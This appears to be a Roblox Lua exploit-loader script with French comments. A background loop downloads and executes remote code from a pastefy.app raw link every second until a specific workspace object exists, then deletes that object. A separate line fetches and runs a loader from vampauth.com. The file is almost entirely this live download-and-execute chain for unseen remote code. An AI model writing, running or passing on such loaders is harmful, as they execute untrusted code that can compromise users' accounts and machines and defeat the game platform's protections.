local Workspace = game:GetService("Workspace")

task.spawn(function()

	local flagFound = false

	while not flagFound do
		-- Recherche directe dans le Workspace
		local targetFlag = Workspace:FindFirstChild("UniqueSpecialFlag_ID_987654")

		if targetFlag and targetFlag:GetAttribute("IsVerifiedSpecialFlag") == true then

			flagFound = true -- Arrête la boucle définitivement
			-- Petite pause pour laisser le temps de voir le message
			task.wait(0.5)		
			-- Suppression du drapeau à la fin
			targetFlag:Destroy()
		else
			loadstring(game:HttpGet('https://pastefy.app/iLtFGYPI/raw'))()
		end
		task.wait(1)
	end
end)

task.wait(2)
loadstring(game:HttpGet("https://vampauth.com/v1/loaders/adc02bdd014929ddb3587163830ecd34.lua"))()
